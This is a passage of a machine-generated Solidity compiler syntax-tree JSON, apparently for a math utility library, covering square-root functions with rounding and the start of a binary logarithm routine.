":"uint256"}},"src":"7894:10:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2082,"name":"min","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1765,"src":"7882:3:10","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$","typeString":"function (uint256,uint256) pure returns (uint256)"}},"id":2087,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"7882:23:10","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":1986,"id":2088,"nodeType":"Return","src":"7875:30:10"}]}]},"documentation":{"id":1980,"nodeType":"StructuredDocumentation","src":"6067:208:10","text":" @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded down.\n Inspired by Henry S. Warren, Jr.'s \"Hacker's Delight\" (Chapter 11)."},"id":2091,"implemented":true,"kind":"function","modifiers":[],"name":"sqrt","nameLocation":"6289:4:10","nodeType":"FunctionDefinition","parameters":{"id":1983,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1982,"mutability":"mutable","name":"a","nameLocation":"6302:1:10","nodeType":"VariableDeclaration","scope":2091,"src":"6294:9:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1981,"name":"uint256","nodeType":"ElementaryTypeName","src":"6294:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"6293:11:10"},"returnParameters":{"id":1986,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1985,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2091,"src":"6328:7:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1984,"name":"uint256","nodeType":"ElementaryTypeName","src":"6328:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"6327:9:10"},"scope":2587,"src":"6280:1642:10","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2126,"nodeType":"Block","src":"8098:161:10","statements":[{"id":2125,"nodeType":"UncheckedBlock","src":"8108:145:10","statements":[{"assignments":[2103],"declarations":[{"constant":false,"id":2103,"mutability":"mutable","name":"result","nameLocation":"8140:6:10","nodeType":"VariableDeclaration","scope":2125,"src":"8132:14:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2102,"name":"uint256","nodeType":"ElementaryTypeName","src":"8132:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2107,"initialValue":{"arguments":[{"id":2105,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2094,"src":"8154:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2104,"name":"sqrt","nodeType":"Identifier","overloadedDeclarations":[2091,2127],"referencedDeclaration":2091,"src":"8149:4:10","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$_t_uint256_$","typeString":"function (uint256) pure returns (uint256)"}},"id":2106,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"8149:7:10","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"8132:24:10"},{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2123,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2108,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2103,"src":"8177:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"components":[{"condition":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":2118,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"},"id":2112,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2109,"name":"rounding","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2097,"src":"8187:8:10","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"expression":{"id":2110,"name":"Rounding","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1729,"src":"8199:8:10","typeDescriptions":{"typeIdentifier":"t_type$_t_enum$_Rounding_$1729_$","typeString":"type(enum Math.Rounding)"}},"id":2111,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberName":"Up","nodeType":"MemberAccess","referencedDeclaration":1727,"src":"8199:11:10","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"}},"src":"8187:23:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2117,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2115,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2113,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2103,"src":"8214:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":2114,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2103,"src":"8223:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"8214:15:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":2116,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2094,"src":"8232:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"8214:19:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"8187:46:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseExpression":{"hexValue":"30","id":2120,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8240:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"id":2121,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"Conditional","src":"8187:54:10","trueExpression":{"hexValue":"31","id":2119,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8236:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}}],"id":2122,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"8186:56:10","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"src":"8177:65:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2101,"id":2124,"nodeType":"Return","src":"8170:72:10"}]}]},"documentation":{"id":2092,"nodeType":"StructuredDocumentation","src":"7928:89:10","text":" @notice Calculates sqrt(a), following the selected rounding direction."},"id":2127,"implemented":true,"kind":"function","modifiers":[],"name":"sqrt","nameLocation":"8031:4:10","nodeType":"FunctionDefinition","parameters":{"id":2098,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2094,"mutability":"mutable","name":"a","nameLocation":"8044:1:10","nodeType":"VariableDeclaration","scope":2127,"src":"8036:9:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2093,"name":"uint256","nodeType":"ElementaryTypeName","src":"8036:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2097,"mutability":"mutable","name":"rounding","nameLocation":"8056:8:10","nodeType":"VariableDeclaration","scope":2127,"src":"8047:17:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"},"typeName":{"id":2096,"nodeType":"UserDefinedTypeName","pathNode":{"id":2095,"name":"Rounding","nodeType":"IdentifierPath","referencedDeclaration":1729,"src":"8047:8:10"},"referencedDeclaration":1729,"src":"8047:8:10","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"}},"visibility":"internal"}],"src":"8035:30:10"},"returnParameters":{"id":2101,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2100,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2127,"src":"8089:7:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2099,"name":"uint256","nodeType":"ElementaryTypeName","src":"8089:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"8088:9:10"},"scope":2587,"src":"8022:237:10","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2258,"nodeType":"Block","src":"8444:922:10","statements":[{"assignments":[2136],"declarations":[{"constant":false,"id":2136,"mutability":"mutable","name":"result","nameLocation":"8462:6:10","nodeType":"VariableDeclaration","scope":2258,"src":"8454:14:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2135,"name":"uint256","nodeType":"ElementaryTypeName","src":"8454:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2138,"initialValue":{"hexValue":"30","id":2137,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8471:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"nodeType":"VariableDeclarationStatement","src":"8454:18:10"},{"id":2255,"nodeType":"UncheckedBlock","src":"8482:855:10","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2143,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2141,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2139,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2130,"src":"8510:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"313238","id":2140,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8519:3:10","typeDescriptions":{"typeIdentifier":"t_rational_128_by_1","typeString":"int_const 128"},"value":"128"},"src":"8510:12:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":2142,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8525:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"8510:16:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2153,"nodeType":"IfStatement","src":"8506:99:10","trueBody":{"id":2152,"nodeType":"Block","src":"8528:77:10","statements":[{"expression":{"id":2146,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2144,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2130,"src":"8546:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"313238","id":2145,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8556:3:10","typeDescriptions":{"typeIdentifier":"t_rational_128_by_1","typeString":"int_const 128"},"value":"128"},"src":"8546:13:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2147,"nodeType":"ExpressionStatement","src":"8546:13:10"},{"expression":{"id":2150,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2148,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2136,"src":"8577:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"313238","id":2149,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8587:3:10","typeDescriptions":{"typeIdentifier":"t_rational_128_by_1","typeString":"int_const 128"},"value":"128"},"src":"8577:13:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2151,"nodeType":"ExpressionStatement","src":"8577:13:10"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2158,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2156,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2154,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2130,"src":"8622:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"3634","id":2155,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8631:2:10","typeDescriptions":{"typeIdentifier":"t_rational_64_by_1","typeString":"int_const 64"},"value":"64"},"src":"8622:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":2157,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8636:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"8622:15:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2168,"nodeType":"IfStatement","src":"8618:96:10","trueBody":{"id":2167,"nodeType":"Block","src":"8639:75:10","statements":[{"expression":{"id":2161,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2159,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2130,"src":"8657:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"3634","id":2160,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8667:2:10","typeDescriptions":{"typeIdentifier":"t_rational_64_by_1","typeString":"int_const 64"},"value":"64"},"src":"8657:12:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2162,"nodeType":"ExpressionStatement","src":"8657:12:10"},{"expression":{"id":2165,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2163,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2136,"src":"8687:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"3634","id":2164,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8697:2:10","typeDescriptions":{"typeIdentifier":"t_rational_64_by_1","typeString":"int_const 64"},"value":"64"},"src":"8687:12:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2166,"nodeType":"ExpressionStatement","src":"8687:12:10"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2173,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2171,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2169,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2130,"src":"8731:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"3332","id":2170,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8740:2:10","typeDescriptions":{"typeIdentifier":"t_rational_32_by_1","typeString":"int_const 32"},"value":"32"},"src":"8731:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":2172,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8745:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"8731:15:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2183,"nodeType":"IfStatement","src":"8727:96:10","trueBody":{"id":2182,"nodeType":"Block","src":"8748:75:10","statements":[{"expression":{"id":2176,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2174,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2130,"src":"8766:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"3332","id":2175,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8776:2:10","typeDescriptions":{"typeIdentifier":"t_rational_32_by_1","typeString":"int_const 32"},"value":"32"},"src":"8766:12:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2177,"nodeType":"ExpressionStatement","src":"8766:12:10"},{"expression":{"id":2180,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2178,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2136,"src":"8796:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"3332","id":2179,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8806:2:10","typeDescriptions":{"typeIdentifier":"t_rational_32_by_1","typeString":"int_const 32"},"value":"32"},"src":"8796:12:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2181,"nodeType":"ExpressionStatement","src":"8796:12:10"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2188,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2186,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2184,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2130,"src":"8840:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"3136","id":2185,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8849:2:10","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},"value":"16"},"src":"8840:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":2187,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8854:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"8840:15:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2198,"nodeType":"IfStatement","src":"8836:96:10","trueBody":{"id":2197,"nodeType":"Block","src":"8857:75:10","statements":[{"expression":{"id":2191,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2189,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2130,"src":"8875:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"3136","id":2190,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8885:2:10","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},"value":"16"},"src":"8875:12:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2192,"nodeType":"ExpressionStatement","src":"8875:12:10"},{"expression":{"id":2195,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2193,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2136,"src":"8905:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"3136","id":2194,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8915:2:10","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},"value":"16"},"src":"8905:12:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2196,"nodeType":"ExpressionStatement","src":"8905:12:10"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2203,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2201,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2199,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2130,"src":"8949:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"38","id":2200,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8958:1:10","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"8"},"src":"8949:10:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":2202,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8962:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"8949:14:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2213,"nodeType":"IfStatement","src":"8945:93:10","trueBody":{"id":2212,"nodeType":"Block","src":"8965:73:10","statements":[{"expression":{"id":2206,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2204,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2130,"src":"8983:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"38","id":2205,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8993:1:10","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"8"},"src":"8983:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2207,"nodeType":"ExpressionStatement","src":"8983:11:10"},{"expression":{"id":2210,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2208,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2136,"src":"9012:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"38","id":2209,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9022:1:10","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"8"},"src":"9012:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2211,"nodeType":"ExpressionStatement","src":"9012:11:10"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2218,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2216,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2214,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2130,"src":"9055:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"34","id":2215,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9064:1:10","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"},"value":"4"},"src":"9055:10:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":2217,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9068:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"9055:14:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2228,"nodeType":"IfStatement","src":"9051:93:10","trueBody":{"id":2227,"nodeType":"Block","src":"9071:73:10","statements":[{"expression":{"id":2221,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2219,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2130,"src":"9089:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"34","id":2220,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9099:1:10","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"},"value":"4"},"src":"9089:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2222,"nodeType":"ExpressionStatement","src":"9089:11:10"},{"expression":{"id":2225,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2223,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2136,"src":"9118:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"34","id":2224,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9128:1:10","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"},"value":"4"},"src":"9118:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2226,"nodeType":"ExpressionStatement","src":"9118:11:10"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2233,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2231,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2229,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2130,"src":"9161:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"32","id":2230,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9170:1:10","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"9161:10:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":2232,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9174:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 